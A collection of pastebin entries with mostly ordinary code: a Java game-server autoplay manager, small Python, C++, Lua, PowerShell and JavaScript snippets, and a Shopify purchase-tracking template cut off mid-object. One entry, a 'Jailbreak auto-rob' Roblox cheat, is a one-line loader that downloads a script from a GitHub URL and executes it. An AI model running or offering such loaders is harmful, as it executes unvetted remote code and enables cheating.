						if ((pet != null) && player.getAutoUseSettings().getAutoActions().contains(PET_ATTACK_ACTION) && pet.hasAI() && !pet.isMoving() && !pet.isDisabled() && (pet.getAI().getIntention() != CtrlIntention.AI_INTENTION_ATTACK) && (pet.getAI().getIntention() != CtrlIntention.AI_INTENTION_CAST) && creature.isAutoAttackable(player) && GeoEngine.getInstance().canSeeTarget(player, creature))
						{
							pet.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, creature);
						}
						
						// Summon Attack.
						if (player.hasSummon() && player.getAutoUseSettings().getAutoActions().contains(SUMMON_ATTACK_ACTION))
						{
							for (Summon summon : player.getServitors().values())
							{
								if (summon.hasAI() && !summon.isMoving() && !summon.isDisabled() && (summon.getAI().getIntention() != CtrlIntention.AI_INTENTION_ATTACK) && (summon.getAI().getIntention() != CtrlIntention.AI_INTENTION_CAST) && creature.isAutoAttackable(player) && GeoEngine.getInstance().canSeeTarget(player, creature))
								{
									summon.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, creature);
								}
							}
						}
						
						// We take granted that mage classes do not auto hit.
						if (isMageCaster(player))
						{
							continue PLAY;
						}
						
						// Check if actually attacking.
						if (player.hasAI() && !player.isAttackingNow() && !player.isCastingNow() && !player.isMoving() && !player.isDisabled())
						{
							if (player.getAI().getIntention() != CtrlIntention.AI_INTENTION_ATTACK)
							{
								if (creature.isAutoAttackable(player))
								{
									// GeoEngine can see target check.
									if (!GeoEngine.getInstance().canSeeTarget(player, creature))
									{
										player.setTarget(null);
										continue PLAY;
									}
									
									player.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, creature);
								}
							}
							else if (creature.hasAI() && !creature.getAI().isAutoAttacking())
							{
								final Weapon weapon = player.getActiveWeaponItem();
								if (weapon != null)
								{
									final int idleCount = IDLE_COUNT.getOrDefault(player, 0);
									if (idleCount > 10)
									{
										final boolean ranged = weapon.getItemType().isRanged();
										final double angle = Util.calculateHeadingFrom(player, creature);
										final double radian = Math.toRadians(angle);
										final double course = Math.toRadians(180);
										final double distance = (ranged ? player.getCollisionRadius() : player.getCollisionRadius() + creature.getCollisionRadius()) * 2;
										final int x1 = (int) (Math.cos(Math.PI + radian + course) * distance);
										final int y1 = (int) (Math.sin(Math.PI + radian + course) * distance);
										final Location location;
										if (ranged)
										{
											location = new Location(player.getX() + x1, player.getY() + y1, player.getZ());
										}
										else
										{
											location = new Location(creature.getX() + x1, creature.getY() + y1, player.getZ());
										}
										player.getAI().setIntention(CtrlIntention.AI_INTENTION_MOVE_TO, location);
										IDLE_COUNT.remove(player);
									}
									else
									{
										IDLE_COUNT.put(player, idleCount + 1);
									}
								}
							}
						}
						continue PLAY;
					}
				}
				
				// Reset idle count.
				IDLE_COUNT.remove(player);
				
				// Pickup.
				if (player.getAutoPlaySettings().doPickup())
				{
					PICKUP: for (Item droppedItem : World.getInstance().getVisibleObjectsInRange(player, Item.class, 200))
					{
						// Check if item is reachable.
						if ((droppedItem == null) //
							|| (!droppedItem.isSpawned()) //
							|| !GeoEngine.getInstance().canMoveToTarget(player.getX(), player.getY(), player.getZ(), droppedItem.getX(), droppedItem.getY(), droppedItem.getZ(), player.getInstanceWorld()))
						{
							continue PICKUP;
						}
						
						// Move to item.
						if (player.calculateDistance2D(droppedItem) > 70)
						{
							if (!player.isMoving())
							{
								player.getAI().setIntention(CtrlIntention.AI_INTENTION_MOVE_TO, droppedItem);
							}
							continue PLAY;
						}
						
						// Try to pick it up.
						if (!droppedItem.isProtected() || (droppedItem.getOwnerId() == player.getObjectId()))
						{
							player.doPickupItem(droppedItem);
							continue PLAY; // Avoid pickup being skipped.
						}
					}
				}
				
				// Find target.
				Creature creature = null;
				final Party party = player.getParty();
				final Player leader = party == null ? null : party.getLeader();
				if (Config.ENABLE_AUTO_ASSIST && (party != null) && (leader != null) && (leader != player) && !leader.isDead())
				{
					if (leader.calculateDistance3D(player) < (Config.ALT_PARTY_RANGE * 2 /* 2? */))
					{
						final WorldObject leaderTarget = leader.getTarget();
						if ((leaderTarget != null) && (leaderTarget.isAttackable() || (leaderTarget.isPlayable() && !party.containsPlayer(leaderTarget.getActingPlayer()))))
						{
							creature = (Creature) leaderTarget;
						}
						else if ((player.getAI().getIntention() != CtrlIntention.AI_INTENTION_FOLLOW) && !player.isDisabled())
						{
							player.getAI().setIntention(CtrlIntention.AI_INTENTION_FOLLOW, leader);
						}
					}
				}
				else
				{
					double closestDistance = Double.MAX_VALUE;
					TARGET: for (Creature nearby : World.getInstance().getVisibleObjectsInRange(player, Creature.class, player.getAutoPlaySettings().isShortRange() && (targetMode != 2 /* Characters */) && (targetMode != 4 /* Counterattack */) ? 600 : 1400))
					{
						// Skip unavailable creatures.
						if ((nearby == null) || nearby.isAlikeDead())
						{
							continue TARGET;
						}
						
						// Check creature target.
						if (player.getAutoPlaySettings().isRespectfulHunting() && !nearby.isPlayable() && (nearby.getTarget() != null) && (nearby.getTarget() != player) && !player.getServitors().containsKey(nearby.getTarget().getObjectId()))
						{
							continue TARGET;
						}
						
						// Check next target mode.
						if (!isTargetModeValid(targetMode, player, nearby))
						{
							continue TARGET;
						}
						
						// Check if creature is reachable.
						if ((Math.abs(player.getZ() - nearby.getZ()) < 180) && GeoEngine.getInstance().canSeeTarget(player, nearby) && GeoEngine.getInstance().canMoveToTarget(player.getX(), player.getY(), player.getZ(), nearby.getX(), nearby.getY(), nearby.getZ(), player.getInstanceWorld()))
						{
							final double creatureDistance = player.calculateDistance2D(nearby);
							if (creatureDistance < closestDistance)
							{
								creature = nearby;
								closestDistance = creatureDistance;
							}
						}
					}
				}
				
				// New target was assigned.
				if (creature != null)
				{
					player.setTarget(creature);
					
					// We take granted that mage classes do not auto hit.
					if (isMageCaster(player))
					{
						continue PLAY;
					}
					
					player.sendPacket(ExAutoPlayDoMacro.STATIC_PACKET);
				}
			}
		}
		
		private boolean isMageCaster(Player player)
		{
			// On Essence auto attack is enabled via the Auto Attack action.
			if (Config.AUTO_PLAY_ATTACK_ACTION)
			{
				return !player.getAutoUseSettings().getAutoActions().contains(AUTO_ATTACK_ACTION);
			}
			
			// Non Essence like.
			return player.isMageClass() && (player.getRace() != Race.ORC);
		}
		
		private boolean isTargetModeValid(int mode, Player player, Creature creature)
		{
			switch (mode)
			{
				case 1: // Monster
				{
					return creature.isMonster() && creature.isAutoAttackable(player);
				}
				case 2: // Characters
				{
					return creature.isPlayable() && creature.isAutoAttackable(player);
				}
				case 3: // NPC
				{
					return creature.isNpc() && !creature.isMonster() && !creature.isInsideZone(ZoneId.PEACE);
				}
				case 4: // Counterattack
				{
					return creature.isMonster() || (creature.isPlayer() && ((creature.getTarget() == player) && (creature.getActingPlayer().getEinhasadOverseeingLevel() >= 1)));
				}
				default: // Any Target
				{
					return (creature.isNpc() && !creature.isInsideZone(ZoneId.PEACE)) || (creature.isPlayable() && creature.isAutoAttackable(player));
				}
			}
		}
	}
	
	public synchronized void startAutoPlay(Player player)
	{
		for (Set<Player> pool : POOLS)
		{
			if (pool.contains(player))
			{
				return;
			}
		}
		
		player.setAutoPlaying(true);
		
		for (Set<Player> pool : POOLS)
		{
			if (pool.size() < POOL_SIZE)
			{
				player.onActionRequest();
				pool.add(player);
				return;
			}
		}
		
		final Set<Player> pool = ConcurrentHashMap.newKeySet(POOL_SIZE);
		player.onActionRequest();
		pool.add(player);
		ThreadPool.schedulePriorityTaskAtFixedRate(new AutoPlay(pool), TASK_DELAY, TASK_DELAY);
		POOLS.add(pool);
	}
	
	public void stopAutoPlay(Player player)
	{
		for (Set<Player> pool : POOLS)
		{
			if (pool.remove(player))
			{
				player.setAutoPlaying(false);
				
				// Pets must follow their owner.
				if (player.hasServitors())
				{
					for (Summon summon : player.getServitors().values())
					{
						summon.followOwner();
					}
				}
				if (player.hasPet())
				{
					player.getPet().followOwner();
				}
				IDLE_COUNT.remove(player);
				return;
			}
		}
	}
	
	public static AutoPlayTaskManager getInstance()
	{
		return SingletonHolder.INSTANCE;
	}
	
	private static class SingletonHolder
	{
		protected static final AutoPlayTaskManager INSTANCE = new AutoPlayTaskManager();
	}
}
"
jj3H2akQ,Untitled,smj007,Python,Thursday 7th of March 2024 01:33:10 PM CDT,"class FoodRatings:

    def __init__(self, foods: List[str], cuisines: List[str], ratings: List[int]):
        
        self.foodRating = {}
        self.cuisineRatingFood = defaultdict(list)
        self.cuisineFood = {}
        for food, cuisine, rating in zip(foods, cuisines, ratings):
            self.foodRating[food] = rating
            heapq.heappush(self.cuisineRatingFood[cuisine], [-rating, food])
            self.cuisineFood[food] = cuisine

    def changeRating(self, food: str, newRating: int) -> None:
        self.foodRating[food] = newRating
        cuisine = self.cuisineFood[food]
        heapq.heappush(self.cuisineRatingFood[cuisine], [-newRating, food])

    def highestRated(self, cuisine: str) -> str:
        heap = self.cuisineRatingFood[cuisine]

        while heap:
            top, food = heapq.heappop(heap)
            if -top == self.foodRating[food]:
                return food

        return """"
"
NxFZSP2m,СПРИНТ № 5 | Распределение кода по файлам | Урок 3: Директива #include 1/2,chevengur,C++,Thursday 7th of March 2024 12:59:00 PM CDT,"builder.h

#pragma once
#include ""wall.h""
class Builder {
public:
    double CalcBricksNeeded(const Wall& wall) const {
        double height = wall.GetHeight();
        double width = wall.GetWidth();
        return width * height * 5;
    }
};
***************************************************************************************************************************************
wall.h

#pragma once
class Wall {
public:
    Wall(double width, double height)
        : width_(width)
        , height_(height) {
    }

    double GetHeight() const {
        return height_;
    }
    double GetWidth() const {
        return width_;
    }

private:
    double width_;
    double height_;
};
***************************************************************************************************************************************
main.cpp

#include ""builder.h""
#include <iostream>

int main() {
    Wall wall{3.5, 2.5};
    Builder tom;
    std::cout << tom.CalcBricksNeeded(wall);
}"
GgxDStyN,Untitled,james1bow,Java,Thursday 7th of March 2024 12:54:38 PM CDT,"@EventMethod
    public void enterArea(PlayerEnterAreaEvent evt){
        Player player = evt.getPlayer();
        
        Area area = evt.getArea();
        UILabel Buy_Button = (UILabel)player.getAttribute(""Buy_Button"");
        UILabel Sell_Button = (UILabel)player.getAttribute(""Sell_Button"");
        UILabel Owner_Name_Label=(UILabel)player.getAttribute(""Owner_Name_Label"");
        UILabel Area_Id_Label=(UILabel)player.getAttribute(""Area_Id_Label"");
        String Owner_Name = (String)area.getAttribute(""Owner_Name"");
        long Owner_Id = (Long)area.getAttribute(""Owner_Id"");
        long Area_Id = area.getID();
        Owner_Name_Label.setText(""Owner : ""+Owner_Name);
        Area_Id_Label.setText(""Area Id: ""+String.valueOf(Area_Id));
        Buy_Button.setClickable(false);
        Buy_Button.setVisible(false);
        if(Owner_Id==Long.parseLong(player.getUID())){
            Sell_Button.setVisible(true);
            Sell_Button.setClickable(true);
        }
    }
    
    @EventMethod
    public void leaveArea(PlayerLeaveAreaEvent evt){
        
        Player player = evt.getPlayer();
        Timer timer = new Timer(0f, 0.5f, 1, () -> {
            Timer timera = (Timer)player.getAttribute(""timer"");
            if(hasEnteredAreaCheck(player)==false){
                UILabel Buy_Button = (UILabel)player.getAttribute(""Buy_Button"");
                UILabel Sell_Button = (UILabel)player.getAttribute(""Sell_Button"");
                UILabel Owner_Name_Label=(UILabel)player.getAttribute(""Owner_Name_Label"");
                UILabel Area_Id_Label=(UILabel)player.getAttribute(""Area_Id_Label"");
                String Owner_Name = ""Owner: No Owner"";
                Owner_Name_Label.setText(Owner_Name);
                Area_Id_Label.setText(""Area Id: No Id"");
                Buy_Button.setClickable(true);
                Buy_Button.setVisible(true);
                Sell_Button.setVisible(false);
                Sell_Button.setClickable(false);
                timera.kill();
                player.deleteAttribute(""timer"");
            }else{
                timera.kill();
                player.deleteAttribute(""timer"");
            }
            
        });
        player.setAttribute(""timer"", timer);
        timer.start();
        
        
    }
    
    public Boolean hasEnteredAreaCheck(Player player){
        boolean enteredArea =false;
        Area area = player.getCurrentArea();
        if(area!=null){
            enteredArea=true;
        }if(area==null){
            enteredArea=false;
        }
        return enteredArea;
        
    }"
L7rTSy3H,PathFinder,SimTek,Lua,Thursday 7th of March 2024 12:47:47 PM CDT,"local pathFinder = {}
local pfs = game:GetService(""PathfindingService"")
pathFinder.__index = pathFinder

function pathFinder.new(char)
	local self = setmetatable({}, pathFinder)
	self.character = char
	print(""zombie pf initialized: "", self.character.Name)
	self.hum = char:WaitForChild(""Humanoid"")
	self.hrp = char:WaitForChild(""HumanoidRootPart"")
	self.path = pfs:CreatePath()
	self.waypoints = {}
	self.currentWaypoint = 1
	
	self.connection = self.hum.MoveToFinished:Connect(function(reached)
		if reached and self.currentWaypoint < #self.waypoints then
			self.currentWaypoint += 1
			if self.waypoints[self.currentWaypoint].Action == 
				Enum.PathWaypointAction.Jump then
				self.hum.Jump = true
			end
			self.hum:MoveTo(self.waypoints[self.currentWaypoint].Position)
		else
			self.hum:MoveTo(self.hrp.Position)
			self.connection:Disconnect()
		end
	end)
	return self
end

function pathFinder:followPath(goal)
	self.path:ComputeAsync(self.hrp.Position, goal)
	self.waypoints = {}
	self.currentWaypoint = 1
	if self.path.Status == Enum.PathStatus.Success then
		self.waypoints = self.path:GetWaypoints()
		self.hum:MoveTo(self.waypoints[self.currentWaypoint].Position)
		if self.waypoints[self.currentWaypoint].Action == 
			Enum.PathWaypointAction.Jump then
			self.hum.Jump = true
		end
	else
		print(""ugh, path creation failed!"")
	end
end

function pathFinder:destroy()
	self.waypoints = {}
	self.connection:Disconnect()
end


return pathFinder"
7kFgLZH7,MoveIt,SimTek,Lua,Thursday 7th of March 2024 12:45:36 PM CDT,"local svrScriptService = game:GetService(""ServerScriptService"")
local aiUtilsPath = svrScriptService:FindFirstChild(""AITools"")
if not aiUtilsPath then
	aiUtilsPath = script.Parent.AITools
end
local aiUtils = require(aiUtilsPath)	
local pathFinding = require(game.ServerScriptService.PathFinder)
local char = script.Parent
local hrp = char:WaitForChild(""HumanoidRootPart"")
local hum = char:WaitForChild(""Humanoid"")
local myPathFinder = nil
local lastSpotted = nil
local sndPos = nil
local ss = game:GetService(""ServerStorage"")
local be = ss:WaitForChild(""SndBe"")

be.Event:Connect(function(pos)
	sndPos = pos
end)

wait(3)
while wait(.2) do
	local closestHrp = aiUtils:findNearestPlayersHrp(char, 50)
	if closestHrp then
		lastSpotted = closestHrp
		if myPathFinder then
			myPathFinder:destroy()
			myPathFinder = nil
		end
		sndPos = nil
		hum.WalkSpeed = 12
		hum:MoveTo(closestHrp.Position, closestHrp)
		wait(1)
	else
		if lastSpotted and myPathFinder == nil then
			myPathFinder = pathFinding.new(char)
			myPathFinder:followPath(lastSpotted.Position)
			wait(.2)
		elseif sndPos then
			wait(.2)
			myPathFinder = pathFinding.new(char)
			myPathFinder:followPath(sndPos)
			wait(.2)
			sndPos = nil
		end
	end
end

"
kcV4pDZU,Untitled,Josif_tepe,C++,Thursday 7th of March 2024 12:45:34 PM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <map>
#include <algorithm>
using namespace std;
typedef long long ll;
    
int main()
{
    int n, m, x, y;
    cin >> n >> m >> x >> y;
    
    int p1 = 0, p2 = 0;
    for(int i = 0; i <= x; i++) {
        for(int j = 0; j <= x; j++) {
            if(i + j <= y) {
                p1 = i;
                p2 = j;
            }
        }
    }
    int sum1 = 0;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            if(i % 2 == 0 and j % 2 == 0) {
                sum1 += p1;
            }
            else if(i % 2 == 0 and j % 2 == 1) {
                sum1 += p2;
            }
            else if(i % 2 == 1 and j % 2 == 0) {
                sum1 += p2;
            }
            else {
                sum1 += p1;
            }
        }
    }
    int sum2 = 0;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            if(i % 2 == 0 and j % 2 == 0) {
                sum2 += p2;
            }
            else if(i % 2 == 0 and j % 2 == 1) {
                sum2 += p1;
            }
            else if(i % 2 == 1 and j % 2 == 0) {
                sum2 += p1;
            }
            else {
                sum2 += p2;
            }
        }
    }
    cout << max(sum1, sum2) << endl;
    return 0;
}
// 2222222222
// 22222222222
"
5gfFf3kL,Untitled,foadsf,PowerShell,Thursday 7th of March 2024 12:29:23 PM CDT,"$file = ""path\to\your\file.pdf""
$content = [System.IO.File]::ReadAllBytes($file)

# Convert EOF marker and file content to strings for index search
$eofMarker = [System.Text.Encoding]::ASCII.GetBytes(""%%EOF"")
$eofString = [System.Text.Encoding]::ASCII.GetString($eofMarker)
$fileContent = [System.Text.Encoding]::ASCII.GetString($content)

# Find last occurrence of %%EOF
$lastIndex = $fileContent.LastIndexOf($eofString)

if ($lastIndex -ge 0) {
    $newContent = $fileContent.Substring(0, $lastIndex + $eofString.Length)
    [System.IO.File]::WriteAllText($file + "".repaired.pdf"", $newContent)
    Write-Output ""File repaired and saved as $($file).repaired.pdf""
} else {
    Write-Output ""%%EOF not found. File might not need repair.""
}
"
L46LcLDf,Jailbreak auto-rob script,scorti2021,Lua,Thursday 7th of March 2024 12:19:45 PM CDT,"Hello, its script for jailbreak autorob !
You got this my friend :)

Script: loadstring(game:HttpGet(""https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/main/Loader/Regular""))()
Category: jailbreak
Discord server of script: https://discord.gg/75nX5ZgHaF"
FDFiLG7w,"Enter a number, get Infos",GatinhoMeow,JavaScript,Thursday 7th of March 2024 11:40:11 AM CDT,"https://jsfiddle.net/SpectatorPrivate/4g3trn89/show

HTML:

<!DOCTYPE html>
<html lang=""en"">
<head>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>Number Info</title>
<link rel=""stylesheet"" type=""text/css"" href=""styles.css"">
</head>
<body>
<div>
  <h1>Number Info</h1>
  <label for=""numberInput"">Enter a number:</label>
  <input type=""text"" id=""numberInput"">
  <button id=""getInfoButton"">Get Info</button>
  <div id=""result""></div>
</div>

<script src=""script.js""></script>
</body>
</html>

JavaScript:

document.addEventListener('DOMContentLoaded', function() {
  const getInfoButton = document.getElementById('getInfoButton');
  const resultDiv = document.getElementById('result');

  getInfoButton.addEventListener('click', function() {
    const number = parseInt(document.getElementById('numberInput').value);
    const data = calculateInfo(number);
    displayInfo(data, number);
  });

  function calculateInfo(number) {
    const englishRepresentation = convertToEnglish(number);
    const todayDate = new Date().toString();
    const millisecondsToSeconds = (number / 1000).toFixed(2) + "" seconds"";
    const secondsToMinutes = (number / 60).toFixed(2) + "" minutes"";
    const minutesToHour = (number / 60).toFixed(2) + "" hour"";
    const hourToDays = (number / 24).toFixed(2) + "" days"";
    const daysToYear = (number / 365.25).toFixed(5) + "" year""; // considerando um ano bissexto
    const daysToLeapYear = (number / 366).toFixed(5) + "" year""; // considerando um ano bissexto
    const yearToCentury = (number / 100).toFixed(2) + "" century"";

    const involution = Math.pow(number, 2);
    const bytesToKilobytes = (number / 1024).toFixed(7) + "" Kilobytes"";
    const bytesToMegabytes = (number / (1024 * 1024)).toFixed(15) + "" Megabytes"";
    const bytesToGigabytes = (number / (1024 * 1024 * 1024)).toFixed(18) + "" Gigabytes"";
    const bytesToTerabytes = (number / (1024 * 1024 * 1024 * 1024)).toFixed(21) + "" Terabytes"";
    const bytesToPetabytes = (number / (1024 * 1024 * 1024 * 1024 * 1024)).toFixed(24) + "" Petabytes"";
    const bytesToBits = number * 8 + "" Bits"";
    const bytesToKilobits = (number * 8 / 1024).toFixed(5) + "" Kilobits"";
    const bytesToMegabits = (number * 8 / (1024 * 1024)).toFixed(11) + "" Megabits"";
    const bytesToGigabits = (number * 8 / (1024 * 1024 * 1024)).toFixed(14) + "" Gigabits"";
    const decimalToBinary = number.toString(2);
    const decimalToOctal = number.toString(8);
    const decimalToHexadecimal = number.toString(16);
    const asciiToBinary = number.toString().split('').map(char => char.charCodeAt(0).toString(2)).join(' ');
    const asciiToText = String.fromCharCode(number);
    const metersToCentimeter = (number * 100).toFixed(2) + "" centimeter"";
    const metersToMillimeter = (number * 1000).toFixed(2) + "" millimeter"";
    const metersToKilometer = (number / 1000).toFixed(2) + "" kilometer"";
    const metersToFeets = (number * 3.28084).toFixed(2) + "" feets"";
    const metersToMiles = (number * 0.000621371).toFixed(11) + "" miles"";
    const metersToInch = (number * 39.3701).toFixed(2) + "" inch"";
    const metersToLeague = (number * 0.000207123).toFixed(13) + "" league"";
    const metersToNauticalLeague = (number * 0.000179986).toFixed(12) + "" league [nautical]"";
    const metersToMicroinch = (number * 39370078.7402).toFixed(2) + "" microinch"";
    const metersToYard = (number * 1.09361).toFixed(2) + "" yard"";

    return {
      englishRepresentation,
      todayDate,
      millisecondsToSeconds,
      secondsToMinutes,
      minutesToHour,
      hourToDays,
      daysToYear,
      daysToLeapYear,
      yearToCentury,
      involution,
      bytesToKilobytes,
      bytesToMegabytes,
      bytesToGigabytes,
      bytesToTerabytes,
      bytesToPetabytes,
      bytesToBits,
      bytesToKilobits,
      bytesToMegabits,
      bytesToGigabits,
      decimalToBinary,
      decimalToOctal,
      decimalToHexadecimal,
      asciiToBinary,
      asciiToText,
      metersToCentimeter,
      metersToMillimeter,
      metersToKilometer,
      metersToFeets,
      metersToMiles,
      metersToInch,
      metersToLeague,
      metersToNauticalLeague,
      metersToMicroinch,
      metersToYard,
      number
    };
  }

  function convertToEnglish(number) {
    const singleDigits = ['', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine'];
    const teenDigits = ['Ten', 'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen', 'Seventeen', 'Eighteen', 'Nineteen'];
    const tensDigits = ['', '', 'Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety'];
    const scales = ['', 'Thousand', 'Million', 'Billion', 'Trillion', 'Quadrillion', 'Quintillion', 'Sextillion', 'Septillion', 'Octillion', 'Nonillion', 'Decillion'];

    if (number === 0) return 'Zero';
    if (number < 0) return 'Negative ' + convertToEnglish(-number);

    let groupCount = 0;
    let result = '';

    while (number > 0) {
      if (number % 1000 !== 0) {
        let tempResult = convertToEnglishLessThanThousand(number % 1000);

        if (groupCount > 0) {
          tempResult += ' ' + scales[groupCount];
        }

        result = tempResult + ' ' + result;
      }

      number = Math.floor(number / 1000);
      groupCount++;
    }

    return result.trim();
  }

  function convertToEnglishLessThanThousand(number) {
    const singleDigits = ['', 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight', 'Nine'];
    const teenDigits = ['Ten', 'Eleven', 'Twelve', 'Thirteen', 'Fourteen', 'Fifteen', 'Sixteen', 'Seventeen', 'Eighteen', 'Nineteen'];
    const tensDigits = ['', '', 'Twenty', 'Thirty', 'Forty', 'Fifty', 'Sixty', 'Seventy', 'Eighty', 'Ninety'];

    let result = '';

    if (number >= 100) {
      result += singleDigits[Math.floor(number / 100)] + ' Hundred ';
      number %= 100;
    }

    if (number >= 20) {
      result += tensDigits[Math.floor(number / 10)] + ' ';
      number %= 10;
    } else if (number >= 10) {
      result += teenDigits[number - 10] + ' ';
      number = 0;
    }

    if (number > 0) {
      result += singleDigits[number] + ' ';
    }

    return result.trim();
  }

  function displayInfo(data, number) {
    resultDiv.innerHTML = `
      <div style=""text-align: center;"">
        <p style=""font-size: 64px;""><strong>${number}</strong></p>
        <p style=""font-size: 36px; font-weight: bold;"">${data.englishRepresentation}</p>
      </div>
      <div>
        <p>Time data:</p>
        <ul>
          <li>Today's date: ${data.todayDate}</li>
          <li>Milliseconds to seconds: ${data.millisecondsToSeconds}</li>
          <li>Seconds to minutes: ${data.secondsToMinutes}</li>
          <li>Minutes to hour: ${data.minutesToHour}</li>
          <li>Hour to days: ${data.hourToDays}</li>
          <li>Days to year: ${data.daysToYear}</li>
          <li>Days to a leap year: ${data.daysToLeapYear}</li>
          <li>Year to century: ${data.yearToCentury}</li>
        </ul>
        <p>IT data:</p>
        <ul>
          <li>Involution of ${number} is ${data.involution}</li>
          <li>${number} bytes is ${data.bytesToKilobytes}</li>
          <li>${number} bytes is ${data.bytesToMegabytes}</li>
          <li>${number} bytes is ${data.bytesToGigabytes}</li>
          <li>${number} bytes is ${data.bytesToTerabytes}</li>
          <li>${number} bytes is ${data.bytesToPetabytes}</li>
          <li>${number} bytes is ${data.bytesToBits}</li>
          <li>${number} bytes is ${data.bytesToKilobits}</li>
          <li>${number} bytes is ${data.bytesToMegabits}</li>
          <li>${number} bytes is ${data.bytesToGigabits}</li>
          <li>Decimal to binary is ${data.decimalToBinary}</li>
          <li>Decimal to octal is ${data.decimalToOctal}</li>
          <li>Decimal to hexadecimal is ${data.decimalToHexadecimal}</li>
          <li>${number} ASCII to Binary is ${data.asciiToBinary}</li>
          <li>${number} ASCII to Text is ${data.asciiToText}</li>
        </ul>
        <p>Distance data:</p>
        <ul>
          <li>${number} meters is ${data.metersToCentimeter}</li>
          <li>${number} meters is ${data.metersToMillimeter}</li>
          <li>${number} meters is ${data.metersToKilometer}</li>
          <li>${number} meters is ${data.metersToFeets}</li>
          <li>${number} meters is ${data.metersToMiles}</li>
          <li>${number} meters is ${data.metersToInch}</li>
          <li>${number} meters is ${data.metersToLeague}</li>
          <li>${number} meters is ${data.metersToNauticalLeague}</li>
          <li>${number} meters is ${data.metersToMicroinch}</li>
          <li>${number} meters is ${data.metersToYard}</li>
        </ul>
      </div>
    `;
  }
});


CSS:

.container {
  max-width: 600px;
  margin: 0 auto;
  text-align: center;
}

input[type=""text""] {
  width: 100px;
  margin: 10px;
}

button {
  padding: 10px 20px;
  background-color: #007bff;
  color: #fff;
  border: none;
  cursor: pointer;
}

button:hover {
  background-color: #0056b3;
}

"
SHP183rd,DL - purchase - Shopify,RodrigoOrnelas,JavaScript,Thursday 7th of March 2024 11:38:38 AM CDT,"<!-- INICIO SCRIPT PARA GERAR DATALAYER →

{% comment %} Purchase data layer v2.1 - part of ""Shopify GA4 Kit"" by Analyzify
Visit https://analyzify.app/shopify-google-analytics/ga4 for complete tutorial 
{% endcomment %}

{% assign template_name = template.name %}

<script type=""text/javascript"">
window.dataLayer = window.dataLayer || [];

window.appStart = function(){
  window.allPageHandle = function(){
    window.dataLayer.push({
      event: ""ga4kit_info"",
      contentGroup: ""{{ template_name }}"",
      {% if customer %}
      userType: ""member"",
      customer: {
        id: ""{{- checkout.customer.id | json -}}"",
        lastOrder: ""{{- customer.last_order.created_at | date: '%B %d, %Y %I:%M%p' -}}"",
        orderCount: ""{{- checkout.customer.orders_count | json -}}"",
        totalSpent: ""{{- checkout.customer.total_spent | times: 0.01 | json -}}"",
        tags: {{- checkout.customer.tags | json -}}
      }
      {% else %}
        userType: ""visitor"",
      {% endif %}
    });
  };
  allPageHandle();

{% if first_time_accessed and post_purchase_page_accessed != true %}

  var shippingPrice = ""{{shipping_price | money_without_currency }}"".replace("","", ""."");
  var totalPrice = ""{{checkout.total_price | money_without_currency }}"".replace("","", ""."");
  var taxPrice = ""{{tax_price | money_without_currency }}"".replace("","", ""."");
  var orderItemsName = [];
  var orderItemsId = [];
  var orderItemsCategory = [];
  var orderItemsBrand = [];
  var orderItemsType = [];
  var orderItemsPrice = [];
  var orderItemsSku = [];
  var orderItemsvariantId = [];
  var orderItemsQuantity = [];
  var orderItemsvariantTitle = [];
  var totalQuantity = 0;

  {% for line_item in checkout.line_items %}  
      orderItemsName.push(""{{ line_item.product.title | remove: ""'"" | remove: '""'}}"");
      orderItemsId.push(""{{ line_item.product_id }}"");
      orderItemsPrice.push(""{{ line_item.price | times: 0.01 }}"");
      orderItemsSku.push(""{{ line_item.sku | remove: ""'"" | remove: '""' }}"");
      orderItemsQuantity.push(""{{ line_item.quantity }}"");
      orderItemsvariantId.push(""{{ line_item.variant_id }}"");
      orderItemsvariantTitle.push(""{{ line_item.variant.title }}"");
      orderItemsCategory.push(""{{ line_item.product.collections.last.title | remove: ""'"" | remove: '""' }}"");
      orderItemsBrand.push(""{{ line_item.vendor | remove: ""'"" | remove: '""' }}"");
      orderItemsType.push(""{{ line_item.product.type | remove: ""'"" | remove: '""' }}"");
      totalQuantity += {{ line_item.quantity }};
  {% endfor %}

  window.dataLayer.push({  
      page_type: ""purchase"",
      event: ""analyzify_purchase"",
      currency: ""{{ shop.currency }}"",
      totalValue: totalPrice,
      totalValueStatic: totalPrice,
      currencyRate: window.Shopify.currency.rate,
      shipping: shippingPrice,
      tax: taxPrice,
      payment_type: ""{{order.transactions[0].gateway}}"",
      {% if order.name %}
      transaction_id: ""{{order.name | remove: ""'"" | remove: '""'}}"",
      {% else %}
      transaction_id: ""{{checkout.id | remove: ""'"" | remove: '""'}}"",
      {% endif %}
      productName: orderItemsName,
      productId: orderItemsId,
      productBrand: orderItemsBrand,
      productCategory: orderItemsCategory,
      productVariantId: orderItemsvariantId,
      productVariantTitle: orderItemsvariantTitle,
      productSku: orderItemsSku,
      productType: orderItemsSku,
      productPrice: orderItemsPrice,
      productQuantity: orderItemsQuantity,
  });

{% endif %}

}
appStart();
</script>

<script>
  var ecommerce = {
      'transaction_id': '{{checkout.order_number  | json}}',
      'affiliation': {{shop.name | json}},
      'value': {{checkout.total_price | money_without_currency | replace: ',', '.' | json}},
      'tax': {{checkout.tax_price | money_without_currency | replace: ',','.' | json}},
      'shipping': {{checkout.shipping_price | money_without_currency | replace: ',','.' | json}},
      'subtotal': {{checkout.subtotal_price | money_without_currency| replace: ',','.' | json}},
      'currency': {{checkout.currency | json}},
       {% for discount in checkout.discounts %}
      'coupon': {{discount.code | json}},
      'discount'  : {{discount.amount | money_without_currency | json}},
       {% endfor %}
      'email': {{checkout.email | json}},
      'phone': {{checkout.phone | json}},
      'first_name': {{customer_address.first_name | json}},
       'fullName'  : {{checkout.billing_address.name | json}},
       'firstName' : {{checkout.billing_address.first_name | json}},
       'lastName'  : {{checkout.billing_address.last_name | json}},
       'address1'  : {{checkout.billing_address.address1 | json}},
